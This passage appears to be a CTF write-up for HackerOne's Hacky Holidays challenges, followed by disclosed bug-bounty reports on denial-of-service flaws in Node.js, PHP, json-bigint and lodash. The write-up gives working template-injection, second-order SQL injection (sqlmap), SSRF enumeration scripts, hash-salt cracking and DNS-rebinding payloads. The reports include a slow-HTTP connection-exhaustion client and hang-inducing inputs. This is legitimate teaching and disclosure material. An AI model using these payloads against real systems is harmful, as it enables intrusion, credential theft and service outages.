When we change `preview_markup` parameter and instruct the server to include non existing external template:
```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
[...]

preview_markup=Hello {{template:nonexistent}} ....&preview_data={"name":"Alice","email":"alice@test.com"} 

HTTP/1.1 200 OK
Cannot find template file /templates/nonexistent
```
Which reveals that `/templates` directory exists. Let's check its contents (luckily directory listing is enabled):
{F1127790}

It is not possible to access those files directly (403 Forbidden).
## Template Injection
Also it is not possible to access file `38dhs_admins_only_header.html` via including it as a template:
```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

preview_markup=Hello {{template:38dhs_admins_only_header.html }} ....&preview_data={"name":"Alice","email":"alice@test.com"} 
```
as we get following response:
```http
HTTP/1.1 200 OK
Connection: close
Content-Length: 64

You do not have access to the file 38dhs_admins_only_header.html
```

But it seems that when we inject template command into `preview_data` parameter this command will be evaluated without restrictions:
```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com

preview_markup=Hello {{name}} ....&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```
response:
```html
Hello <html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4> ....
```
### Flag 7: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}

# Flag 8

Grinch started a forum. It seems that our goal here is to login as admin and read posts from admin only section.

## GitHub repository
It turned out that this flag required some OSINT skills. When checking Adam Langley (CTF author) GitHub account
https://github.com/adamtlangley we can spot that his last commit was done on `GrinchNetworks/forum` repository:
{F1128318}

This repository contains whole source code of Grinch Forum app.
Next thing is to analyze how application works and also to analyze commit history. Sometimes developers push sensitive data (credentials, API keys) with the code. 

And in fact  in one of the commits we can see that Adam removed database credentials:
{F1128338}

* DB User: forum
* DB Password: 6HgeAZ0qC9T6CQIqJpD

## Phpmyadmin
Quick directory fuzzing reveals that there is `phpmyadmin` installed here: https://hackyholidays.h1ctf.com/forum/phpmyadmin. Lets try to login with leaked DB credentials.

We were able to login with those credentials and we have access to `forum` database and `user` table:
{F1128359}

We can see that user `grinch` is an admin and we have access to hash of his password:
**35D652126CA1706B59DB02C93E0C9FBF**

## Password hash
Quick check on https://crackstation.net/ reveals that this hash was already cracked:
{F1128363}
And `grinch` password is `BahHumbug`

## Login as admin
Using above credentials we can log in as admin and reveal the flag:
{F1128432}

### Flag 8: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
# Flag 9
{F1129138}
Evil Quiz is an application where user:
1. Provides his name
2. Answers some quiz questions.
3. Gets his score.

Again, probably the goal here is to log in as admin.
A careful eye can spot information about number of users having the same name as name provided by user in Step 1. This is probably put there intentionally as a feedback for some vulnerability. After some basic checks It turned out that this assumption was correct. Name parameter is vulnerable to SQL injection:
True statement:
{F1129639}

False statement:
{F1129639}

So this is second order blind boolean sql injection. I guess the intention of CTF autor was to prevent automatic tools like `sqlmap` to find this vulnerability and in fact those tools won't be able to find it.

But when we know how to trigger the vulnerability we can use the power of  `sqlmap` to ex-filtrate the database.
`sqlmap` is able to check for second order SQL injections with use of `--second-url` and `--second-req` parameters.

Also we can specify that this is boolean injection type `--technique=B` and provide the response representing false condition with `--not-string`. To make it easy for `sqlmap` to locate specific parameters we will provide two HTTP requests (one for sending the payload (`-r`) and second for retrieving the response (`--second-req`):
```shell
$ sqlmap -r evil-quiz1.req --second-req=evil-quiz2.req --not-string="There is 0" --technique=B -D quiz -T admin -C password --dump

[22:18:59] [INFO] parsing HTTP request from 'evil-quiz1.req'
[22:18:59] [INFO] parsing second-order HTTP request from 'evil-quiz2.req'
[22:18:59] [INFO] resuming back-end DBMS 'mysql'
[22:18:59] [INFO] testing connection to the target URL

Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=grinch' AND 9363=9363 AND 'mRVl'='mRVl
---
[22:19:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[22:19:34] [INFO] fetching entries of column(s) '`password`' for table 'admin' in database 'quiz'
[22:19:34] [INFO] fetching number of column(s) '`password`' entries for table 'admin' in database 'quiz'
[22:19:34] [INFO] resumed: 1
[22:19:34] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[22:19:34] [INFO] retrieved:
[22:19:38] [WARNING] reflective value(s) found and filtering out
S3creT_p4ssw0rd-$
Database: quiz
Table: admin
[1 entry]
+-------------------+
| password          |
+-------------------+
| S3creT_p4ssw0rd-$ |
+-------------------+
```
We found admin password. After login in we get the flag:
{F1129717}

### Flag 9: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}

# Flag 10 - Signup Manager
On Signup Manager user name register his account and after approval he will become a member of Grinch Army.

## Comment left by developer
After checking page source code we can spot a comment left by developer:
```html
 <!-- See README.md for assistance -->
```
Content of this *README.md*:
> **SignUp Manager**
> 
> SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
> 
> **How to Install**
> 1) Create a directory that you wish SignUp Manager to be installed into
> 2) Move signupmanager.zip into the new directory and unzip it.
> 3) For security move users.txt into a directory that cannot be read from website visitors
> 4) Update index.php with the location of your users.txt file
> 5) Edit the user and admin php files to display your hidden content
> 6) You can make anyone an admin by changing the last character in the users.txt file to a Y
> 7) Default login is admin / password

## Access to source code
*README.md* file mentioned `signupmanager.zip` file. Let's download it:
```bash
wget https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip
unzip signupmanager.zip
  inflating: README.md
  inflating: admin.php
  inflating: index.php
  inflating: signup.php
  inflating: user.php
```

## Source code review

After reviewing source code we see that usernames are stored in `users.txt` where each user record occupies one line of exactly 113 characters. format is as follows:
{F1129772}
where numbers in square brackets describe how many characters each field occupy.
Last character (#113) gives info if created user is an admin or not but regular user doesn't have control over this field. It's always defined as 'N' (not admin).

The idea to exploit this app is to overflow somehow the line construction algorithm and store character 'Y' in the last byte of the line.

It seems that all parts of the line are properly padded/truncated to their max length... Except `Age` which is `integer`.
Here is the part of the code that checks this parameter:
```php
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
```
We can see that first it checks if we are dealing with a string containing numeric value, if doesn't contain more than 3 chars and THEN it is converted to integer.

The problem is that PHP accepts different number notations. E.g. notation *1e3* is perfectly fine for PHP and after conversion it will become `1000`.

That is how we can overflow this line creation algorithm. Setting `age=1e3` passes all the checks: it is a number, it's exactly 3 characters long. And after conversion we have a number that is 4 characters long!

Let's sign up with following request:
```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Type: application/x-www-form-urlencoded

action=signup&username=account123&password=password&age=1e3&firstname=XXX&lastname=YYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
```
`Age` parameter contains our malicious number. `Lastname` contains a lot of 'Y' characters to overflow the Admin field.

The result is a response with a session Cookie:
```http
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 25 Dec 2020 15:05:37 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=d843a6e76ee8a818f5429498c4337a23; expires=Fri, 25-Dec-2020 16:05:37 GMT; Max-Age=3600
Location: /signup-manager/
Content-Length: 0
```
When we refresh main page with this cookie set we get the flag:
{F1129788}
### Flag 10: flag{99309f0f-1752-44a5-af1e-a03e4150757d}

# Flag 11 - Recon Server
This challenge starts from hidden directory (available after solving challenge 10) https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59

Couple of observed things:
1. Call to `/album?hash=jdh34k` endpoint will response with links to `/picture` endpoint witch retrieves pictures from the server
2. `/picture` endpoint accepts `data` parameter that is base64 encoded JSON:
```json
{"image":"r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg","auth":"bbf295d686bd2af346fcd80c5398de9a"}
```
3. User cannot tamper with `image` parameter as this is protected by `auth` signature.
4. There is an `/api` endpoint but any call results in an error: `{"error":"This endpoint cannot be visited from this IP address"}`

## First SQL Injection
It turned out ``/album?hash=` parameter is vulnerable to SQL injection.
Following request:
```http
GET /r3c0n_server_4fdk59/album?hash=c'+UNION+ALL+SELECT+1,2,3--+- HTTP/1.1
```

responds with:

```html
<img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzBhMzgyYzYxNzdiMDQzODZlMWE0NWNlZWFhODEyZTRlLmpwZyIsImF1dGgiOiJlYzVhOTkyMGUxNzdjY2M4NDk3NDE0NmY5M2FlMDRiMCJ9">
```
which is a request for image `0a382c6177b04386e1a45ceeaa812e4e.jpg`.

## SQLi inside SQLi
Interesting point is that for those two payloads:

* `UNION ALL SELECT 1,2,3`
* `UNION ALL SELECT 2,2,3`

we get different results (different images filenames).

That means value of first column is probably used to retrieve the file name from the database. We can imagine the pseudo code like this:
```
($file_id, $col3, $col_3) = SELECT file_id, col_2, col_3 FROM fileIdTable
($file_name) = SELECT file_name FROM files WHERE file_id=$file_id
```
So maybe we could put there second SQLi to force second query to respond with string under our control. After some fiddling this payload did the trick:
`UNION ALL SELECT "-1' union all select NULL,NULL,'A'-- -",2,3-- -`

```http
GET /r3c0n_server_4fdk59/album?hash='+UNION+ALL+SELECT+"-1'+union+all+select+NULL,NULL,'A'--+-",2,3--+- HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
```
Results in response:
```
{"image":"r3c0n_server_4fdk59\/uploads\/A","auth":"60146c0f9a44a825faa23e2dd179c13d"}
```
So now we are in control of filename!

## Path traversal and SSRF
As we can control the path that is retrieved by the server maybe we can access the `/api` endpoint that was not accessible before.

To speed up the process of performing SQLi and retrieving the data following bash script was used:
```bash
#!/bin/bash

url=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\?hash=\'+UNION+ALL+SELECT+\"-1\'+union+all+select+NULL,NULL,\'${1}\'--+-\",2,3--+- -s|grep data= |sed 's/^.*src="\([^"]*\)">/\1/')
curl -s "https://hackyholidays.h1ctf.com$url"
echo
```
Script usage:
```shell
./sqlinception.sh some_path
Expected HTTP status 200, Received: 404
```
That means that we performed an SSRF request but application expected return code 200 but got 404.
Let's check what will be retrieved when we hit existing path:
To access main page we can use path traversal:

```shell
./sqlinception.sh ..
Invalid content type detected
```
That means system returned code 200 but content type was not an image (as we call an endpoint that is used to retrieve images, probably it expects `image/*` content type.

Also we have access to API now:
```shell
./sqlinception.sh ../api/x
Expected HTTP status 200, Received: 404
```
We didn't get 401 Unathorized but 404 Not found.

## API endpoint enumeration
With a bit of bash automation a we can enumerate API endpoints:
```bash
while read word
  do echo -n $word:
  bash sqlinception.sh ../api/$word
done <wordlist.txt |grep -v 404
```
Following endpoints returned *Invalid content type detected* instead of *error 404*:
* /api/user
* /api/ping

## API parameter enumeration
When we try to pass some parameters to /api/user endpoint we get error 400:
```shell
./sqlinception.sh ../api/user\?a=1
Expected HTTP status 200, Received: 400
```

According to API "documentation" from the `/api` page:
{F1129906}
Error 400 means param name is invalid. Again we can enumerate valid params:
```bash
while read word
  do echo -n $word:
  bash sqlinception.sh ../api/user\?$word=1
done <wordlist.txt |grep -v 400
```

Valid parameters found:
* username
* password

## User enumeration
When we call `/api/user` endpoint with parameter `username` set to something random we get error code 204 (Successful request but no data found).
```shell
./sqlinception.sh ../api/user\?username=xx
Expected HTTP status 200, Received: 204
```

But after some fuzzing with different characters it turned out that response is different when `%` sign is used:
```shell
./sqlinception.sh ../api/user\?username=%
Invalid content type detected
```
Immediate idea was that maybe username is passed to SQL query into LIKE statement. And maybe we can find the username by sequentialy checking responses to `a%`, `b%` etc.
Again bash script helped:
```bash
prevchar=''
while true; do
    for char in {{a..z},{0..9},{A..Z}}; do
        ./sqlinception.sh ../api/user\?username=$prevchar$char% |grep -q -v 204
        if [ $? -eq 0 ]; then
             echo -n $char
             prevchar=$prevchar$char
             break
       fi
    done
done
```
result is: **grinchadmin**

We can also enumerate password as this is working exactly the same with `%` sign:
```bash
while true; do
    for char in {{a..z},{0..9},{A..Z}}; do
        ./sqlinception.sh ../api/user\?password=$prevchar$char% |grep -q -v 204
        if [ $? -eq 0 ]; then
             echo -n $char
             prevchar=$prevchar$char
             break
       fi
    done
done
```
Result: **s4nt4sucks**

Now we have admin credentials and we can log in into **Attack Box** https://hackyholidays.h1ctf.com/attack-box/login

{F1130002}

### Flag 11: flag{07a03135-9778-4dee-a83c-7ec330728e72}

# Flag 12
We have access to Grinch Network Attack server. Our goal is to perform DDoS attack on Grinch own network using his attack server.

There are three IP addresses to attack. When attack is initiated following request is made:
```http
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cookie: attackbox=d0xxxxxxxxxx75e0199a5e91dde9687
```

where `payload` parameter holds base64 encoded JSON string:
```json
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

## Cracking the salt
So we have a MD5 signature that protects the `target` parameter. Any change in signature or target param results in an error.

But having both message (IP address in this case) and a hash we could try to bruteforce the salt that is usually appended to message before hashing (as `hash = md5(salt+message)`).

First we need to prepare a wordlist of salt+message:
```bash
cat rockyou.txt | awk '{print $0"203.0.113.33"}' > wordlist.txt
```
Next we need to match known MD5 hash to each hashed wordlist item (fastest way is to use `hashcat`):
```bash
echo 5f2940d65ca4140cc18d0878bc398955 > hash.txt
hashcat -m 0 -a 0 hash.txt wordlist.txt
```

Hashcat quickly finds matching hash:
```
5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33

Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: 5f2940d65ca4140cc18d0878bc398955
Time.Started.....: Fri Dec 25 22:03:10 2020 (1 sec)
Time.Estimated...: Fri Dec 25 22:03:11 2020 (0 secs)
Guess.Base.......: File (list.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.Dev.#1.....:  4458.6 kH/s (0.58ms)
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 5357568/14343893 (37.35%)
Rejected.........: 0/5357568 (0.00%)
Restore.Point....: 5349376/14343893 (37.29%)
Candidates.#1....: mrkr2518203.0.113.33 -> mpisti88203.0.113.33
HWMon.Dev.#1.....: N/A
```
md5 salt: **mrgrinch463**

## Changing IP address
Having a salt we can sign our own messages. As the goal of final challenge is to DDoS Grinch, obvious selection would be to change IP address to 127.0.0.1:
```bash
echo -n mrgrinch463127.0.0.1 | md5sum -
3e3f8df1658372edf0214e202acb460b
```
Next we launch DDoS attack with following payload:
```
json:
{"target":"127.0.0.1","hash":"c4d677f60c076b72bb28d2051c76831a"}

base64 encoded: 
eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
```

Final URL: https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==

Result: 
{F1130044}

Unfortunately our attack on localhost was detected.

## Localhost check bypass
One thing that was observed during initial recon phase was that `target` parameter accepts also hostnames.
Unfortunately testing all kinds of localhost check bypasses:
* using hostname pointing to 127.0.0.1 like http://localtest.me
* using different IP notations

all failed.

That means hostnames are resolved and IP address is checked against the blacklist.

But we can try to use **DNS rebinding attack** where we put DNS service that resolves the same hostname to two different IP addresses in sequence (also setting very short TTL to prevent caching of DNS responses).

If application first resolves hostname to check against blacklist but then resolves it again to perform an action, we can bypass first check by providing valid IP. Second DNS request will resolve to malicious IP.

This is quite easy to achieve with online services like https://lock.cmpxchg8b.com/rebinder.html.

We can specify two IP addresses and service will prepare DNS rebinding attack:
{F1130059}

Service generated following hostname:  7f000001.cb007121.rbndr.us

Let's construct the payload:
```
echo -n mrgrinch4637f000001.cb007121.rbndr.us | md5sum
54171d97f5299ef84c1c01a676eaa917  -

json:
{"target":"7f000001.cb007121.rbndr.us","hash":"54171d97f5299ef84c1c01a676eaa917"}

base64 encoded: 
eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jYjAwNzEyMS5yYm5kci51cyIsImhhc2giOiI1NDE3MWQ5N2Y1Mjk5ZWY4NGMxYzAxYTY3NmVhYTkxNyJ9
```

Final URL: https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jYjAwNzEyMS5yYm5kci51cyIsImhhc2giOiI1NDE3MWQ5N2Y1Mjk5ZWY4NGMxYzAxYTY3NmVhYTkxNyJ9

Video PoC:
{F1130072}

### Flag 12: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

---

### [Permanent DOS for new users!](https://hackerone.com/reports/1057484)

- **Report ID:** `1057484`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Stripo Inc
- **Reporter:** @akashhamal0x01
- **Bounty:** - usd
- **Disclosed:** 2020-12-21T12:11:51.051Z
- **CVE(s):** -

**Summary (team):**

The vulnerability has been fixed

**Summary (researcher):**

The team concluded as informative but this issue is active and reproducible enjoy ;)

---

### [DNS Max Responses for DOS](https://hackerone.com/reports/1033107)

- **Report ID:** `1033107`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js
- **Reporter:** @zeus1999
- **Bounty:** 250 usd
- **Disclosed:** 2020-12-16T22:08:53.517Z
- **CVE(s):** CVE-2020-8277

**Vulnerability Information:**

See Github (my issue): https://github.com/nodejs/node/issues/36063


When i try to fetch the A Dns records of following domain: ticbrasil.com.br I dont get any response.
I think thats the case because there are over 1300 responses.

Version: v12.18.4, v14.15.0
Platform: 64-bit Windows 10 Pro & Enterprise

What steps will reproduce the bug?
var dns = require('dns'); dns.resolve4('ticbrasil.com.br', function (err, addresses, family) { console.log(err); console.log(addresses); console.log(family); });

How often does it reproduce? Is there a required condition?
It happends everytime

What is the expected behavior?
https://pastebin.com/Tv53Na89

What do you see instead?
Nothing/No output

## Impact

mmomtchev commented 3 hours ago
@mhdawson someone should contact Mitre or whoever you usually contact, this is a confirmed remote security vulnerability. If an attacker can trigger a DNS resolution for an address chosen by him, then it is exploitable for DoS. It is a very high-risk vulnerability. I don't think a remote access is possible, but this should probably be evaluated by an expert.

@jasnell
 
Member
jasnell commented 2 hours ago
We can look into this further but I have to point out: we have a defined process for properly reporting and investigating potential security vulnerabilities. As soon as this issue was suspected as being a security issue, that process should have been followed with investigation and fixes investigated in the private Node.js repo we use for that purpose, otherwise this ends up risking a zero-day for all Node.js users.

---

### [a very long name in hey.com can prevent anyone from accessing their contacts and probably can cause denial of service](https://hackerone.com/reports/1018037)

- **Report ID:** `1018037`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Basecamp
- **Reporter:** @tw4v3sx
- **Bounty:** 1000 usd
- **Disclosed:** 2020-11-10T13:21:36.935Z
- **CVE(s):** -

**Vulnerability Information:**

Summary :
=========
after trying to change my initial name to something long i found out that their are no limits to how long it can be , so i directly changed it to something very long {F1050497} which caused my account to really slow down when accessing it and in **the android app , it just keeps crashing** whenever i open it ( no way to access my account at all ) + if i make it longer i get a **500 Internal Server Error response** which highly suggests that this can cause a **server side denial of service .**

Description:
==========
due to not checking the length of the name one can change it to a very long one causing both a server side denial of service  and a client side one

server side : 
------------

one can send multiple requests to change the name of the account and each of them containing a very long name which will cause a 500 internal server error leading to an extensive Resource Consumption.

client side : 
-----------
- if one is able to change the name another account he will also have the ability to crash his android app therefore preventing him from accessing his account.
- if one with a long name sends a message to any email he will slowwwwww down everything where the message appears including folders (inbox , trash ..) and prevent him from accessing his contacts where the email's name also appears , because the app will hang on a loading screen for about 40min each time , and this can be more if for example he sends multiple messages or use multiple accounts ( each on with a long name ) to send a message to the victim mail.

Proof of Concept:
==============

1. open `https://app.hey.com/contacts/%user_id_number%/user/edit`and change the name to the one attached {F1050497} and submit.
1. now u can't open the android app and u can slow down anyone's account just by sending them a message (or multiple ones).

## Impact

- **Attacker can perform a DoS Attack against the server**
- **slow down anyone's account**
- **crash the android app**

---

### [Denial of Service by resource exhaustion CWE-400 due to unfinished HTTP/1.1 requests](https://hackerone.com/reports/868834)

- **Report ID:** `868834`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js
- **Reporter:** @shogunpanda
- **Bounty:** 250 usd
- **Disclosed:** 2020-10-17T19:24:45.481Z
- **CVE(s):** CVE-2020-8251

**Vulnerability Information:**

**Summary:** Node.js is vulnerable to HTTP denial of service (DOS) attacks based on delayed requests submission which can make the server unable to accept new connections.

**Description:**

An attacker can open an arbitrary number of HTTP connections and keep the server busy by never completing the request phase.

Node.js only has two requests timeouts:

1. [server.timeout](https://nodejs.org/docs/latest-v12.x/api/http.html#http_server_timeout) that controls the maximum number of milliseconds the socket can be idle. This also includes the server processing time. 
2. [server.headersTimeout](https://nodejs.org/docs/latest-v13.x/api/http.html#http_server_headerstimeout) (Added in Node 11.3.0), that controls the maximum number of milliseconds allowed to receive the full request headers before timing out.

Handling of request bodies is specific to the application code and core Node.js never consumes or parses the request bodies. 

Currently, the body parsing and handling is performed by the following modules:
* [fastify](https://www.fastify.io/)
* [restify](https://restify.com/)
* [busboy](https://github.com/mscdex/busboy), used by [fastify-multpart](https://github.com/fastify/fastify-multipart/) and [multer](https://github.com/expressjs/multer)
* [raw-body](https://github.com/stream-utils/raw-body), used by [body-parser](https://github.com/expressjs/body-parser)

All of the modules above are vulnerable to the attack.

If part of the body is already sent, the body parsing modules above can be patched to impose a request body sending timeout and therefore mitigate the attack.

The application unfortunately can not completely handle this attack. If the attacker never starts sending the body after completing the submission of the headers, the application code is never invoked. 

Prior to Node.js 13.0.0, the default timeout for a request was 2 minutes, which is a countermeasure against this attack.
Starting with Node.js 13.0.0 instead, the default timeout has been changed to be 0 (which means no timeout) in order to address serverless deployments where long running requests are needed. Since the socket is never considered idle, the application is completely vulnerable to the attack.

While `server.headersTimeout` is able to detect a slow request, it is only effective if the delay happens during the headers phase (like in Slowloris attacks). If the attacker delays the start of the headers, the start of body sending or sends the body very slow without resulting in an idle socket, the attack is not detected.

In the long run an unprotected server will have a lot of pending requests to handle. At some point it will reach the open connections limit and therefore will not be able to serve additional requests, resulting in a Denial of Service.

## Steps To Reproduce:

1. From one or more attacking sources, open one or more HTTP connections to the target server
2. For each of the connection in step 1
     2.1. (Optional) Wait a certain amount of time before sending the first request header.
     2.2 Send all request headers with regular pausing.
     2.3 (Optional) Wait a certain amount of time before sending the body data.
     2.4. Send the request body with regular pausing.

All the substeps must be performed by sending periodically the smallest amount of data with the highest delay such that the server does not detect an idle socket. For Node 13.0.0 and above there is no idle timeout by default, so the attacker can wait an arbitrary time. For Node.js prior to 13.0.0, at least one byte each 2 minutes must be sent.

We have tested the following test cases:

1. **Connection established, none or partial headers sent then sending is paused:** If `server.timeout` is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.
2. **Connection established, headers sent with long delays:** `server.headersTimeout` is triggered and closes the connection with no response. 
3. **Connection established, headers sent and sending is paused before starting the body:** If `server.timeout` is not 0, then idle detection is triggered and closes the connection with no response. With the default timeout of 0 in Node.js 13.0.0 and above, the server is completely vulnerable to the attack.
4. **Connection established, headers sent, body sent with long delays:** `server.timeout` is not able to detect the attack and the server is completely vulnerable to the attack.

What follows is a sample code which reproduces the problem. 

```javascript
const { createConnection } = require('net')

let start
let response = ''
let body = ''.padEnd(4096, '123')

const client = createConnection({ port: parseInt(process.argv[2], 10) }, () => {
  start = process.hrtime.bigint()

  // Send all the headers quickly so that server.headersTimeout is not triggered
  client.write('POST / HTTP/1.1\r\n')
  client.write('Content-Type: text/plain\r\n')
  client.write(`Content-Length: ${Buffer.byteLength(body)}\r\n`)
  client.write(`\r\n`)

  // Send the body very slower but in away that the server.timeout is not triggered
  let i = 0
  let interval = setInterval(() => {
    client.write(body[i])
    i++

    // Done sending, end the request
    if (i === body.length) {
      clearInterval(interval)
      client.write(`\r\n\r\n`)
    }
  }, 60000)
})

client.on('data', data => {
  response += data
  client.end()
})

client.on('close', () => {
  const duration = Number(process.hrtime.bigint() - start) / 1e9

  console.log(`Receive the following response (${response.length} bytes) in ${duration.toFixed(3)} s:\n\n`)
  console.log(response)
})
```

Once executed, the client will not receive a response before 4096 minutes. If multiple parallel execution of the code above targets the same server, it will result in service denial. 

## Impact

This attack has very low complexity and can easily trigger a DDOS on an unprotected server.

## Supporting Material/References:

We have written a patch for Node.js ([PR 33304](https://github.com/nodejs/node/pull/33304)) which introduces a new `http.Server` option called `requestTimeout` with a default value in milliseconds of `120000` (2 minutes).

When `requestTimeout` is a positive value, the server will start a new timer set to expire in `requestTimeout` milliseconds when a new connection is established. The timer is also set again if new requests after the first are received on the socket (this handles pipelining and keep-alive cases).
The timer is cancelled in the following case:

1. When the request body is completely received by the server.
2. When the response is completed. This handles the case where the application responds to the client without consuming the request body.
3. When the connection is upgraded, like in the WebSocket case.

If the timer expires, then the server responds with status code 408 and closes the connection. This prevents the DOS attack.

## Acknowledgement

This research was conducted and co-authored by me and [Matteo Collina](matteo.collina@nearform.com) and has been sponsored by [NearForm](https://nearform.com)

## Impact

If an attacker execute a significative amount of requests on a target server without completing any, the server at some point will reach the allowed number of open connections and will not be able to serve any further request, resulting in a Denial of Service.

---

### [DOS in stream filters](https://hackerone.com/reports/505278)

- **Report ID:** `505278`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Internet Bug Bounty
- **Reporter:** @meitis
- **Bounty:** - usd
- **Disclosed:** 2020-10-12T07:22:24.989Z
- **CVE(s):** CVE-2018-10546

**Vulnerability Information:**

see bug report
https://bugs.php.net/bug.php?id=76249

as simple as
<?php
$fh = fopen('php://memory', 'rw');
fwrite($fh, "abc");
rewind($fh);
stream_filter_append($fh, 'convert.iconv.iso-10646/utf8//IGNORE', STREAM_FILTER_READ, []);
echo stream_get_contents($fh);

=> one process running in an endless loop

## Impact

DOS, process ends up in an endless loop, CPU (or available php processes or both) of affected system get easily exhausted

---

### [[json-bigint] DoS via `__proto__` assignment](https://hackerone.com/reports/916430)

- **Report ID:** `916430`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2020-08-25T22:40:36.029Z
- **CVE(s):** CVE-2020-8237

**Vulnerability Information:**

I would like to report a DoS in `json-bigint`.
It allows to cause denial of service using very limited input (~70 bytes).

# Module

**module name:** `json-bigint`
**version:**  0.3.1
**npm page:** `https://www.npmjs.com/package/json-bigint`

## Module Description

> JSON.parse/stringify with bigints support. Based on Douglas Crockford JSON.js package and bignumber.js library.

## Module Stats

2 301 424 weekly downloads

# Vulnerability

## Vulnerability Description

Json parsing library assigns to `__proto__`, which can be abused to confuse `bignumber.js` library, causing a DoS on various operations with the resulting number (stringification, arithmetic) via a very small input (70 bytes).

## Steps To Reproduce:

```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"c":{"__proto__":[],"length":1e200}}'
const r = JSONbig.parse(json)
console.log(r.toString())
```

Note that the object parsed, but an attempt to convert it to a string (or to do any arithmetic operation on it) will hang.

Demo with arithmetic operation hanging:
```js
const JSONbig = require('json-bigint')
const json = '{"__proto__":1000000000000000,"c":{"__proto__":[],"0":42,"length":2}}'
const r = JSONbig.parse(json)
r.dividedBy(42)
```

## Patch

Be careful when assigning to `__proto__` value.

## Supporting Material/References:

- [OPERATING SYSTEM VERSION]: `Linux xps 5.7.6-arch1-1 #1 SMP PREEMPT Thu, 25 Jun 2020 00:14:47 +0000 x86_64 GNU/Linux`
- [NODEJS VERSION]: 14.5.0

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

Denial of service via untrusted input.

---

### [Prototype Pollution lodash 4.17.15](https://hackerone.com/reports/864701)

- **Report ID:** `864701`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @awarau
- **Bounty:** - usd
- **Disclosed:** 2020-08-21T10:34:29.931Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report Prototype Pollution in lodash version 4.17.15
It allows Denial of Service and more. 

# Module
**module name:** lodash
**version:** 4.17.15
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

27M in the last week

# Vulnerability

## Vulnerability Description

## Steps To Reproduce:
1. Create a JS file with this contents:

lod = require('lodash')
lod.setWith({}, "__proto__[test]", "123")
lod.set({}, "__proto__[test2]", "456")
console.log(test)
console.log(test2)

2. Execute it with node
3. Observe that test and test2 are now on the Object.prototype.

## Supporting Material/References:

This is a variation on:
https://hackerone.com/reports/380873

# Wrap up

- I contacted the maintainer to let them know: N 
- I opened an issue in the related repository: N

## Impact

test and test2 could just have easily been toString(). This would allow an attacker to cause a denial of service as all objects inherit from the Object.prototype. 
